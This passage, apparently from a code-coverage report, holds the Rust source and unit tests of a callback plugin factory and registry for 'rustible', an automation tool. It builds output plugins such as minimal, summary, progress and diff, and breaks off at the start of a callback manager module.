(e.g., \"minimal\", \"null\", \"summary\")\n//! - Configuration through the existing `CallbackConfig` and `PluginConfig` structures\n//! - List all available built-in plugins\n//! - Extensible through custom plugin registration\n//!\n//! # Example\n//!\n//! ```rust,ignore\n//! use rustible::callback::factory::{PluginFactory, PluginRegistry};\n//! use rustible::callback::config::CallbackConfig;\n//!\n//! // Create with default configuration\n//! let plugin = PluginFactory::create(\"minimal\", \u0026CallbackConfig::default())?;\n//!\n//! // Create with custom configuration\n//! let config = CallbackConfig::for_plugin(\"null\");\n//! let null_callback = PluginFactory::create(\"null\", \u0026config)?;\n//!\n//! // List available plugins\n//! for info in PluginFactory::available_plugins() {\n//!     println!(\"{}: {}\", info.name, info.description);\n//! }\n//! ```\n\nuse std::collections::HashMap;\nuse std::fmt;\nuse std::sync::Arc;\n\nuse crate::callback::config::{CallbackConfig, PluginConfig};\nuse crate::callback::plugins::{\n    DiffCallback, DiffConfig, MinimalCallback,\n    NullCallback, ProgressCallback, ProgressConfig, SelectiveCallback, SelectiveConfig,\n    SummaryCallback, SummaryConfig,\n};\nuse crate::traits::ExecutionCallback;\n\n// ============================================================================\n// Error Types\n// ============================================================================\n\n/// Error type for plugin factory operations.\n#[derive(Debug, Clone)]\npub struct PluginFactoryError {\n    /// The kind of error that occurred.\n    pub kind: PluginFactoryErrorKind,\n    /// Additional context about the error.\n    pub message: String,\n}\n\n/// Types of errors that can occur in the plugin factory.\n#[derive(Debug, Clone, PartialEq, Eq)]\npub enum PluginFactoryErrorKind {\n    /// The requested plugin was not found.\n    UnknownPlugin,\n    /// Invalid configuration was provided.\n    InvalidConfig,\n    /// Plugin initialization failed.\n    InitializationFailed,\n}\n\nimpl fmt::Display for PluginFactoryError {\n    fn fmt(\u0026self, f: \u0026mut fmt::Formatter\u003c'_\u003e) -\u003e fmt::Result {\n        match \u0026self.kind {\n            PluginFactoryErrorKind::UnknownPlugin =\u003e {\n                write!(f, \"Unknown plugin: {}\", self.message)\n            }\n            PluginFactoryErrorKind::InvalidConfig =\u003e {\n                write!(f, \"Invalid configuration: {}\", self.message)\n            }\n            PluginFactoryErrorKind::InitializationFailed =\u003e {\n                write!(f, \"Plugin initialization failed: {}\", self.message)\n            }\n        }\n    }\n}\n\nimpl std::error::Error for PluginFactoryError {}\n\nimpl PluginFactoryError {\n    /// Create an error for an unknown plugin.\n    pub fn unknown_plugin(name: \u0026str) -\u003e Self {\n        Self {\n            kind: PluginFactoryErrorKind::UnknownPlugin,\n            message: format!(\n                \"'{}'. Available plugins: {}\",\n                name,\n                PluginFactory::available_plugin_names().join(\", \")\n            ),\n        }\n    }\n\n    /// Create an error for invalid configuration.\n    pub fn invalid_config(message: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            kind: PluginFactoryErrorKind::InvalidConfig,\n            message: message.into(),\n        }\n    }\n\n    /// Create an error for initialization failure.\n    #[allow(dead_code)]\n    pub fn init_failed(message: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            kind: PluginFactoryErrorKind::InitializationFailed,\n            message: message.into(),\n        }\n    }\n}\n\n/// Result type for plugin factory operations.\npub type PluginResult\u003cT\u003e = Result\u003cT, PluginFactoryError\u003e;\n\n// ============================================================================\n// Plugin Information\n// ============================================================================\n\n/// Information about an available plugin.\n#[derive(Debug, Clone)]\npub struct PluginInfo {\n    /// The plugin's unique name.\n    pub name: \u0026'static str,\n    /// A brief description of the plugin.\n    pub description: \u0026'static str,\n    /// The plugin type/category.\n    pub plugin_type: PluginType,\n    /// Available configuration options.\n    pub options: Vec\u003cPluginOptionInfo\u003e,\n}\n\n/// Type/category of a callback plugin.\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\npub enum PluginType {\n    /// Stdout/display plugins for terminal output.\n    Stdout,\n    /// Notification plugins (email, slack, etc.).\n    Notification,\n    /// Logging/output file plugins.\n    Logging,\n    /// Aggregation/statistics plugins.\n    Aggregate,\n}\n\nimpl fmt::Display for PluginType {\n    fn fmt(\u0026self, f: \u0026mut fmt::Formatter\u003c'_\u003e) -\u003e fmt::Result {\n        match self {\n            PluginType::Stdout =\u003e write!(f, \"stdout\"),\n            PluginType::Notification =\u003e write!(f, \"notification\"),\n            PluginType::Logging =\u003e write!(f, \"logging\"),\n            PluginType::Aggregate =\u003e write!(f, \"aggregate\"),\n        }\n    }\n}\n\n/// Information about a plugin configuration option.\n#[derive(Debug, Clone)]\npub struct PluginOptionInfo {\n    /// Option name.\n    pub name: \u0026'static str,\n    /// Option description.\n    pub description: \u0026'static str,\n    /// Option type.\n    pub option_type: \u0026'static str,\n    /// Default value as string.\n    pub default: \u0026'static str,\n}\n\n// ============================================================================\n// Plugin Factory\n// ============================================================================\n\n/// Factory type alias for plugin creation functions.\npub type PluginFactoryFn =\n    Box\u003cdyn Fn(\u0026CallbackConfig) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e + Send + Sync\u003e;\n\n/// Factory for creating callback plugins by name.\n///\n/// This factory provides a centralized way to instantiate callback plugins\n/// using their string name and configuration options.\npub struct PluginFactory;\n\nimpl PluginFactory {\n    /// Create a callback plugin by name with the given configuration.\n    ///\n    /// # Arguments\n    ///\n    /// * `name` - The name of the plugin to create (case-insensitive).\n    /// * `config` - Configuration for the callback system.\n    ///\n    /// # Returns\n    ///\n    /// An `Arc\u003cdyn ExecutionCallback\u003e` if successful, or an error if the plugin\n    /// is unknown or configuration is invalid.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let plugin = PluginFactory::create(\"minimal\", \u0026CallbackConfig::default())?;\n    /// ```\n    pub fn create(\n        name: \u0026str,\n        config: \u0026CallbackConfig,\n    ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        let name_lower = name.to_lowercase();\n\n        // Get plugin-specific config if available\n        let plugin_config = config.get_plugin_config(\u0026name_lower);\n\n        match name_lower.as_str() {\n            // ================================================================\n            // Stdout Plugins\n            // ================================================================\n            \"minimal\" =\u003e Self::create_minimal(config, plugin_config),\n            \"null\" | \"silent\" | \"quiet\" =\u003e Self::create_null(config, plugin_config),\n            \"summary\" =\u003e Self::create_summary(config, plugin_config),\n            \"progress\" =\u003e Self::create_progress(config, plugin_config),\n            \"selective\" =\u003e Self::create_selective(config, plugin_config),\n            \"diff\" =\u003e Self::create_diff(config, plugin_config),\n\n            // ================================================================\n            // Notification Plugins (temporarily disabled - notification.rs needs fixes)\n            // ================================================================\n            // \"notification\" | \"notify\" =\u003e Self::create_notification(config, plugin_config),\n\n            _ =\u003e Err(PluginFactoryError::unknown_plugin(name)),\n        }\n    }\n\n    /// Create a callback plugin with default configuration.\n    ///\n    /// This is a convenience method for creating plugins without custom options.\n    pub fn create_default(name: \u0026str) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        Self::create(name, \u0026CallbackConfig::default())\n    }\n\n    /// Create multiple plugins from a list of names.\n    ///\n    /// Returns all successfully created plugins. Failed plugins are logged\n    /// but don't prevent other plugins from being created.\n    pub fn create_many(\n        names: \u0026[\u0026str],\n        config: \u0026CallbackConfig,\n    ) -\u003e Vec\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        names\n            .iter()\n            .filter_map(|name| Self::create(name, config).ok())\n            .collect()\n    }\n\n    /// Create all enabled plugins from a configuration.\n    ///\n    /// Uses the `enabled_plugins` list from the configuration to create\n    /// all specified callback plugins.\n    pub fn create_from_config(config: \u0026CallbackConfig) -\u003e Vec\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        config\n            .enabled_plugins\n            .iter()\n            .filter_map(|name| {\n                if config.is_plugin_enabled(name) {\n                    Self::create(name, config).ok()\n                } else {\n                    None\n                }\n            })\n            .collect()\n    }\n\n    /// Returns a list of all available plugin names.\n    pub fn available_plugin_names() -\u003e Vec\u003c\u0026'static str\u003e {\n        vec![\n            \"minimal\",\n            \"null\",\n            \"summary\",\n            \"progress\",\n            \"selective\",\n            \"diff\",\n            // \"notification\", // temporarily disabled\n        ]\n    }\n\n    /// Returns detailed information about all available plugins.\n    pub fn available_plugins() -\u003e Vec\u003cPluginInfo\u003e {\n        vec![\n            PluginInfo {\n                name: \"minimal\",\n                description: \"Minimal output - only failures and final recap (ideal for CI/CD)\",\n                plugin_type: PluginType::Stdout,\n                options: vec![],\n            },\n            PluginInfo {\n                name: \"null\",\n                description: \"Silent callback - produces no output (for scripting)\",\n                plugin_type: PluginType::Stdout,\n                options: vec![],\n            },\n            PluginInfo {\n                name: \"summary\",\n                description:\n                    \"Summary callback with customizable output and unreachable host handling\",\n                plugin_type: PluginType::Stdout,\n                options: vec![\n                    PluginOptionInfo {\n                        name: \"show_per_host\",\n                        description: \"Show per-host statistics breakdown\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                    PluginOptionInfo {\n                        name: \"show_timing\",\n                        description: \"Show task timing information\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                    PluginOptionInfo {\n                        name: \"use_colors\",\n                        description: \"Use ANSI colors in output\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                ],\n            },\n            PluginInfo {\n                name: \"progress\",\n                description: \"Visual progress bars for playbook execution (requires indicatif)\",\n                plugin_type: PluginType::Stdout,\n                options: vec![\n                    PluginOptionInfo {\n                        name: \"show_host_bars\",\n                        description: \"Show individual progress bars per host\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                    PluginOptionInfo {\n                        name: \"use_colors\",\n                        description: \"Use colored progress bars\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                ],\n            },\n            PluginInfo {\n                name: \"selective\",\n                description: \"Selective output based on status filters (ok, changed, failed, etc.)\",\n                plugin_type: PluginType::Stdout,\n                options: vec![\n                    PluginOptionInfo {\n                        name: \"show_ok\",\n                        description: \"Show OK tasks\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                    PluginOptionInfo {\n                        name: \"show_changed\",\n                        description: \"Show changed tasks\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                    PluginOptionInfo {\n                        name: \"show_skipped\",\n                        description: \"Show skipped tasks\",\n                        option_type: \"bool\",\n                        default: \"false\",\n                    },\n                    PluginOptionInfo {\n                        name: \"show_failed\",\n                        description: \"Show failed tasks\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                ],\n            },\n            PluginInfo {\n                name: \"diff\",\n                description: \"Shows before/after diffs for changed files\",\n                plugin_type: PluginType::Stdout,\n                options: vec![\n                    PluginOptionInfo {\n                        name: \"context_lines\",\n                        description: \"Number of context lines around changes\",\n                        option_type: \"integer\",\n                        default: \"3\",\n                    },\n                    PluginOptionInfo {\n                        name: \"use_colors\",\n                        description: \"Use ANSI colors for diffs\",\n                        option_type: \"bool\",\n                        default: \"true\",\n                    },\n                ],\n            },\n            // Notification plugin - temporarily disabled (notification.rs needs fixes)\n            // PluginInfo {\n            //     name: \"notification\",\n            //     description: \"External notifications (Slack, Email, Webhooks)\",\n            //     plugin_type: PluginType::Notification,\n            //     options: vec![...],\n            // },\n        ]\n    }\n\n    /// Check if a plugin with the given name exists.\n    pub fn plugin_exists(name: \u0026str) -\u003e bool {\n        let name_lower = name.to_lowercase();\n        Self::available_plugin_names().iter().any(|\u0026n| {\n            n.to_lowercase() == name_lower\n                || n.replace('_', \"-\") == name_lower\n                || n.replace('-', \"_\") == name_lower\n        })\n    }\n\n    /// Get information about a specific plugin.\n    pub fn get_plugin_info(name: \u0026str) -\u003e Option\u003cPluginInfo\u003e {\n        let name_lower = name.to_lowercase();\n        Self::available_plugins().into_iter().find(|p| {\n            p.name.to_lowercase() == name_lower\n                || p.name.replace('_', \"-\") == name_lower\n                || p.name.replace('-', \"_\") == name_lower\n        })\n    }\n\n    // ========================================================================\n    // Private Factory Methods for Each Plugin\n    // ========================================================================\n\n    fn create_minimal(\n        _config: \u0026CallbackConfig,\n        _plugin_config: Option\u003c\u0026PluginConfig\u003e,\n    ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        Ok(Arc::new(MinimalCallback::new()))\n    }\n\n    fn create_null(\n        _config: \u0026CallbackConfig,\n        _plugin_config: Option\u003c\u0026PluginConfig\u003e,\n    ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        Ok(Arc::new(NullCallback::new()))\n    }\n\n    fn create_summary(\n        config: \u0026CallbackConfig,\n        plugin_config: Option\u003c\u0026PluginConfig\u003e,\n    ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        let mut summary_config = SummaryConfig::default();\n\n        // Apply global config\n        summary_config.use_colors = config.use_colors;\n        summary_config.show_timing = config.show_task_timing;\n\n        // Apply plugin-specific config\n        if let Some(pc) = plugin_config {\n            if let Some(v) = pc.get_bool(\"show_host_details\") {\n                summary_config.show_host_details = v;\n            }\n            if let Some(v) = pc.get_bool(\"show_timing\") {\n                summary_config.show_timing = v;\n            }\n            if let Some(v) = pc.get_bool(\"use_colors\") {\n                summary_config.use_colors = v;\n            }\n            if let Some(v) = pc.get_bool(\"compact_mode\") {\n                summary_config.compact_mode = v;\n            }\n            if let Some(v) = pc.get_bool(\"show_exit_code_hint\") {\n                summary_config.show_exit_code_hint = v;\n            }\n        }\n\n        Ok(Arc::new(SummaryCallback::with_config(summary_config)))\n    }\n\n    fn create_progress(\n        config: \u0026CallbackConfig,\n        plugin_config: Option\u003c\u0026PluginConfig\u003e,\n    ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        let mut progress_config = ProgressConfig::default();\n\n        // Apply global config\n        progress_config.use_color = config.use_colors;\n\n        // Apply plugin-specific config\n        if let Some(pc) = plugin_config {\n            if let Some(v) = pc.get_bool(\"use_color\") {\n                progress_config.use_color = v;\n            }\n            if let Some(v) = pc.get_bool(\"show_task_spinners\") {\n                progress_config.show_task_spinners = v;\n            }\n            if let Some(v) = pc.get_bool(\"show_elapsed\") {\n                progress_config.show_elapsed = v;\n            }\n            if let Some(v) = pc.get_bool(\"show_eta\") {\n                progress_config.show_eta = v;\n            }\n            if let Some(v) = pc.get_i64(\"spinner_tick_ms\") {\n                progress_config.spinner_tick_ms = v as u64;\n            }\n            if let Some(v) = pc.get_i64(\"max_task_spinners\") {\n                progress_config.max_task_spinners = v as usize;\n            }\n        }\n\n        Ok(Arc::new(ProgressCallback::with_config(progress_config)))\n    }\n\n    fn create_selective(\n        config: \u0026CallbackConfig,\n        plugin_config: Option\u003c\u0026PluginConfig\u003e,\n    ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        let mut selective_config = SelectiveConfig::default();\n\n        // Apply global config - SelectiveConfig uses StatusFilter and FilterMode\n        // The global config options are mapped to the appropriate filter settings\n        if !config.show_ok {\n            selective_config.status_filter.failures_only = true;\n        }\n        if !config.show_skipped {\n            selective_config.status_filter.skipped_only = false;\n        }\n\n        // Apply plugin-specific config\n        if let Some(pc) = plugin_config {\n            if let Some(v) = pc.get_bool(\"failures_only\") {\n                selective_config.status_filter.failures_only = v;\n            }\n            if let Some(v) = pc.get_bool(\"changes_only\") {\n                selective_config.status_filter.changes_only = v;\n            }\n            if let Some(v) = pc.get_bool(\"skipped_only\") {\n                selective_config.status_filter.skipped_only = v;\n            }\n            if let Some(v) = pc.get_bool(\"verbose\") {\n                selective_config.verbose = v;\n            }\n        }\n\n        Ok(Arc::new(SelectiveCallback::new(selective_config)))\n    }\n\n    fn create_diff(\n        config: \u0026CallbackConfig,\n        plugin_config: Option\u003c\u0026PluginConfig\u003e,\n    ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        let mut diff_config = DiffConfig::default();\n\n        // Apply global config\n        diff_config.use_color = config.use_colors;\n        diff_config.enabled = config.show_diff;\n\n        // Apply plugin-specific config\n        if let Some(pc) = plugin_config {\n            if let Some(v) = pc.get_i64(\"context_lines\") {\n                diff_config.context_lines = v as usize;\n            }\n            if let Some(v) = pc.get_bool(\"use_color\") {\n                diff_config.use_color = v;\n            }\n            if let Some(v) = pc.get_bool(\"show_line_numbers\") {\n                diff_config.show_line_numbers = v;\n            }\n            if let Some(v) = pc.get_i64(\"max_lines\") {\n                diff_config.max_lines = v as usize;\n            }\n            if let Some(v) = pc.get_bool(\"enabled\") {\n                diff_config.enabled = v;\n            }\n        }\n\n        Ok(Arc::new(DiffCallback::with_config(diff_config)))\n    }\n\n    // Notification plugin - temporarily disabled (notification.rs needs fixes)\n    // fn create_notification(\n    //     _config: \u0026CallbackConfig,\n    //     plugin_config: Option\u003c\u0026PluginConfig\u003e,\n    // ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n    //     let mut notification_config = NotificationConfig::from_env();\n    //     if let Some(pc) = plugin_config {\n    //         if let Some(v) = pc.get_bool(\"notify_on_success\") {\n    //             notification_config.notify_on_success = v;\n    //         }\n    //         if let Some(v) = pc.get_bool(\"notify_on_failure\") {\n    //             notification_config.notify_on_failure = v;\n    //         }\n    //     }\n    //     Ok(Arc::new(NotificationCallback::with_config(notification_config)))\n    // }\n}\n\n// ============================================================================\n// Plugin Registry (for custom/external plugins)\n// ============================================================================\n\n/// Registry for custom callback plugins.\n///\n/// This allows users to register their own callback plugins that can be\n/// created by name, just like the built-in plugins.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::factory::PluginRegistry;\n/// use std::sync::Arc;\n///\n/// let mut registry = PluginRegistry::new();\n///\n/// registry.register(\"my_plugin\", |config| {\n///     Ok(Arc::new(MyCustomCallback::new(config)))\n/// });\n///\n/// let plugin = registry.create(\"my_plugin\", \u0026CallbackConfig::default())?;\n/// ```\npub struct PluginRegistry {\n    /// Registered plugin factories\n    factories: HashMap\u003cString, PluginFactoryFn\u003e,\n}\n\nimpl Default for PluginRegistry {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl PluginRegistry {\n    /// Create a new empty plugin registry.\n    pub fn new() -\u003e Self {\n        Self {\n            factories: HashMap::new(),\n        }\n    }\n\n    /// Create a registry pre-populated with all built-in plugins.\n    pub fn with_builtins() -\u003e Self {\n        let mut registry = Self::new();\n\n        for name in PluginFactory::available_plugin_names() {\n            let name_owned = name.to_string();\n            registry.register(name, move |config| {\n                PluginFactory::create(\u0026name_owned, config)\n            });\n        }\n\n        registry\n    }\n\n    /// Register a custom plugin factory.\n    ///\n    /// The factory function receives the callback configuration and should\n    /// return an Arc-wrapped callback plugin or an error.\n    pub fn register\u003cF\u003e(\u0026mut self, name: \u0026str, factory: F)\n    where\n        F: Fn(\u0026CallbackConfig) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e + Send + Sync + 'static,\n    {\n        self.factories\n            .insert(name.to_lowercase(), Box::new(factory));\n    }\n\n    /// Unregister a plugin factory.\n    pub fn unregister(\u0026mut self, name: \u0026str) -\u003e bool {\n        self.factories.remove(\u0026name.to_lowercase()).is_some()\n    }\n\n    /// Create a plugin by name.\n    ///\n    /// First checks the registry for custom plugins, then falls back\n    /// to built-in plugins.\n    pub fn create(\n        \u0026self,\n        name: \u0026str,\n        config: \u0026CallbackConfig,\n    ) -\u003e PluginResult\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        let name_lower = name.to_lowercase();\n\n        // Check custom registry first\n        if let Some(factory) = self.factories.get(\u0026name_lower) {\n            return factory(config);\n        }\n\n        // Fall back to built-in factory\n        PluginFactory::create(name, config)\n    }\n\n    /// Check if a plugin is registered.\n    pub fn is_registered(\u0026self, name: \u0026str) -\u003e bool {\n        self.factories.contains_key(\u0026name.to_lowercase())\n    }\n\n    /// List all registered plugin names.\n    pub fn registered_names(\u0026self) -\u003e Vec\u003c\u0026str\u003e {\n        self.factories.keys().map(|s| s.as_str()).collect()\n    }\n\n    /// Get combined list of registered and built-in plugin names.\n    pub fn all_available_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        let mut names: Vec\u003cString\u003e = self.factories.keys().cloned().collect();\n\n        for builtin in PluginFactory::available_plugin_names() {\n            if !names.iter().any(|n| n == builtin) {\n                names.push(builtin.to_string());\n            }\n        }\n\n        names.sort();\n        names\n    }\n}\n\nimpl fmt::Debug for PluginRegistry {\n    fn fmt(\u0026self, f: \u0026mut fmt::Formatter\u003c'_\u003e) -\u003e fmt::Result {\n        f.debug_struct(\"PluginRegistry\")\n            .field(\n                \"registered_plugins\",\n                \u0026self.factories.keys().collect::\u003cVec\u003c_\u003e\u003e(),\n            )\n            .finish()\n    }\n}\n\n// ============================================================================\n// Unit Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_create_minimal_plugin() {\n        let plugin = PluginFactory::create(\"minimal\", \u0026CallbackConfig::default());\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_create_null_plugin() {\n        let plugin = PluginFactory::create(\"null\", \u0026CallbackConfig::default());\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_create_summary_plugin() {\n        let plugin = PluginFactory::create(\"summary\", \u0026CallbackConfig::default());\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_create_progress_plugin() {\n        let plugin = PluginFactory::create(\"progress\", \u0026CallbackConfig::default());\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_create_selective_plugin() {\n        let plugin = PluginFactory::create(\"selective\", \u0026CallbackConfig::default());\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_create_diff_plugin() {\n        let plugin = PluginFactory::create(\"diff\", \u0026CallbackConfig::default());\n        assert!(plugin.is_ok());\n    }\n\n    // Notification test - temporarily disabled\n    // #[test]\n    // fn test_create_notification_plugin() {\n    //     let plugin = PluginFactory::create(\"notification\", \u0026CallbackConfig::default());\n    //     assert!(plugin.is_ok());\n    // }\n\n    #[test]\n    fn test_create_with_config() {\n        let mut config = CallbackConfig::default();\n        let mut plugin_config = PluginConfig::enabled();\n        plugin_config.set_option(\"show_per_host\", true);\n        plugin_config.set_option(\"show_timing\", false);\n        config.plugins.insert(\"summary\".to_string(), plugin_config);\n\n        let plugin = PluginFactory::create(\"summary\", \u0026config);\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_create_unknown_plugin() {\n        let result = PluginFactory::create(\"unknown_plugin\", \u0026CallbackConfig::default());\n        assert!(result.is_err());\n\n        let err = result.unwrap_err();\n        assert_eq!(err.kind, PluginFactoryErrorKind::UnknownPlugin);\n        assert!(err.message.contains(\"unknown_plugin\"));\n    }\n\n    #[test]\n    fn test_case_insensitive_names() {\n        assert!(PluginFactory::create(\"MINIMAL\", \u0026CallbackConfig::default()).is_ok());\n        assert!(PluginFactory::create(\"Minimal\", \u0026CallbackConfig::default()).is_ok());\n        assert!(PluginFactory::create(\"NULL\", \u0026CallbackConfig::default()).is_ok());\n    }\n\n    #[test]\n    fn test_alternative_names() {\n        // Test aliases\n        assert!(PluginFactory::create(\"silent\", \u0026CallbackConfig::default()).is_ok());\n        assert!(PluginFactory::create(\"quiet\", \u0026CallbackConfig::default()).is_ok());\n        // \"notify\" temporarily disabled (notification plugin disabled)\n        // assert!(PluginFactory::create(\"notify\", \u0026CallbackConfig::default()).is_ok());\n    }\n\n    #[test]\n    fn test_available_plugin_names() {\n        let names = PluginFactory::available_plugin_names();\n        assert!(names.contains(\u0026\"minimal\"));\n        assert!(names.contains(\u0026\"null\"));\n        assert!(names.contains(\u0026\"summary\"));\n        assert!(names.contains(\u0026\"progress\"));\n        assert!(names.contains(\u0026\"selective\"));\n        assert!(names.contains(\u0026\"diff\"));\n        // Notification temporarily disabled\n        // assert!(names.contains(\u0026\"notification\"));\n    }\n\n    #[test]\n    fn test_available_plugins_info() {\n        let plugins = PluginFactory::available_plugins();\n        assert!(!plugins.is_empty());\n\n        let minimal = plugins.iter().find(|p| p.name == \"minimal\");\n        assert!(minimal.is_some());\n        assert_eq!(minimal.unwrap().plugin_type, PluginType::Stdout);\n\n        let summary = plugins.iter().find(|p| p.name == \"summary\");\n        assert!(summary.is_some());\n        assert!(!summary.unwrap().options.is_empty());\n    }\n\n    #[test]\n    fn test_plugin_exists() {\n        assert!(PluginFactory::plugin_exists(\"minimal\"));\n        assert!(PluginFactory::plugin_exists(\"null\"));\n        assert!(PluginFactory::plugin_exists(\"summary\"));\n        assert!(!PluginFactory::plugin_exists(\"nonexistent\"));\n    }\n\n    #[test]\n    fn test_get_plugin_info() {\n        let info = PluginFactory::get_plugin_info(\"summary\");\n        assert!(info.is_some());\n\n        let info = info.unwrap();\n        assert_eq!(info.name, \"summary\");\n        assert!(!info.options.is_empty());\n    }\n\n    #[test]\n    fn test_plugin_factory_error_display() {\n        let err = PluginFactoryError::unknown_plugin(\"test\");\n        assert!(err.to_string().contains(\"Unknown plugin\"));\n        assert!(err.to_string().contains(\"test\"));\n\n        let err = PluginFactoryError::invalid_config(\"bad config\");\n        assert!(err.to_string().contains(\"Invalid configuration\"));\n\n        let err = PluginFactoryError::init_failed(\"init error\");\n        assert!(err.to_string().contains(\"initialization failed\"));\n    }\n\n    #[test]\n    fn test_create_default() {\n        let plugin = PluginFactory::create_default(\"minimal\");\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_create_many() {\n        let plugins = PluginFactory::create_many(\n            \u0026[\"minimal\", \"null\", \"nonexistent\"],\n            \u0026CallbackConfig::default(),\n        );\n        // Should create 2 plugins (minimal and null), nonexistent is skipped\n        assert_eq!(plugins.len(), 2);\n    }\n\n    #[test]\n    fn test_create_from_config() {\n        let mut config = CallbackConfig::default();\n        config.enabled_plugins = vec![\"minimal\".to_string(), \"null\".to_string()];\n        config\n            .plugins\n            .insert(\"minimal\".to_string(), PluginConfig::enabled());\n        config\n            .plugins\n            .insert(\"null\".to_string(), PluginConfig::enabled());\n\n        let plugins = PluginFactory::create_from_config(\u0026config);\n        assert_eq!(plugins.len(), 2);\n    }\n\n    // ========================================================================\n    // Registry Tests\n    // ========================================================================\n\n    #[test]\n    fn test_plugin_registry_new() {\n        let registry = PluginRegistry::new();\n        assert!(registry.registered_names().is_empty());\n    }\n\n    #[test]\n    fn test_plugin_registry_with_builtins() {\n        let registry = PluginRegistry::with_builtins();\n        assert!(registry.is_registered(\"minimal\"));\n        assert!(registry.is_registered(\"null\"));\n    }\n\n    #[test]\n    fn test_plugin_registry_register() {\n        let mut registry = PluginRegistry::new();\n\n        registry.register(\"custom\", |_config| {\n            Ok(Arc::new(MinimalCallback::new()) as Arc\u003cdyn ExecutionCallback\u003e)\n        });\n\n        assert!(registry.is_registered(\"custom\"));\n        assert!(registry.is_registered(\"CUSTOM\")); // Case-insensitive\n\n        let plugin = registry.create(\"custom\", \u0026CallbackConfig::default());\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_plugin_registry_unregister() {\n        let mut registry = PluginRegistry::new();\n\n        registry.register(\"custom\", |_config| {\n            Ok(Arc::new(MinimalCallback::new()) as Arc\u003cdyn ExecutionCallback\u003e)\n        });\n\n        assert!(registry.unregister(\"custom\"));\n        assert!(!registry.is_registered(\"custom\"));\n        assert!(!registry.unregister(\"custom\")); // Already removed\n    }\n\n    #[test]\n    fn test_plugin_registry_fallback_to_builtin() {\n        let registry = PluginRegistry::new();\n\n        // Should find built-in even though registry is empty\n        let plugin = registry.create(\"minimal\", \u0026CallbackConfig::default());\n        assert!(plugin.is_ok());\n    }\n\n    #[test]\n    fn test_plugin_registry_all_available_names() {\n        let mut registry = PluginRegistry::new();\n        registry.register(\"custom\", |_| {\n            Ok(Arc::new(MinimalCallback::new()) as Arc\u003cdyn ExecutionCallback\u003e)\n        });\n\n        let names = registry.all_available_names();\n        assert!(names.contains(\u0026\"custom\".to_string()));\n        assert!(names.contains(\u0026\"minimal\".to_string()));\n        assert!(names.contains(\u0026\"null\".to_string()));\n    }\n\n    #[test]\n    fn test_plugin_registry_debug() {\n        let registry = PluginRegistry::with_builtins();\n        let debug_str = format!(\"{:?}\", registry);\n        assert!(debug_str.contains(\"PluginRegistry\"));\n    }\n}\n","traces":[{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":660,"address":[],"length":0,"stats":{"Line":0}},{"line":661,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":6},{"path":["/","home","artur","Repositories","rustible","src","callback","manager.rs"],"content":"//! Callback Manager for Rustible's Plugin System\n//!\n//! This module provides the [`CallbackManager`] which orchestrates multiple callback\n//! plugins during playbook execution. It supports:\n//!\n//! - Plugin priorities (stdout plugins run first)\n//! - Async event dispatch to all registered plugins\n//! - Graceful error handling (one plugin failure doesn't stop others)\n//! - Runtime plugin registration/deregistration\n//! - Thread-safe concurrent execution\n//!\n//! # Architecture\n//!\n//! ```text\n//! +---------------------------------------------------------------------+\n//! |                       CallbackManager                                |\n//! |                                                                      |\n//! |  +-------------------------------------------------------------+    |\n//! |  |                    Plugin Registry                           |    |\n//! |  |  +----------+  +----------+  +----------+  +----------+     |    |\n//! |  |  | stdout   |  |  json    |  |  timer   |  |  custom  |     |    |\n//! |  |  | priority |  | priority |  | priority |  | priority |     |    |\n//! |  |  |   100    |  |   200    |  |   300    |  |   500    |     |    |\n//! |  |  +----------+  +----------+  +----------+  +----------+     |    |\n//! |  +-------------------------------------------------------------+    |\n//! |                              |                                       |\n//! |                              v                                       |\n//! |  +-------------------------------------------------------------+    |\n//! |  |               Event Dispatcher (async)                       |    |\n//! |  |                                                              |    |\n//! |  |  - Sorts plugins by priority                                 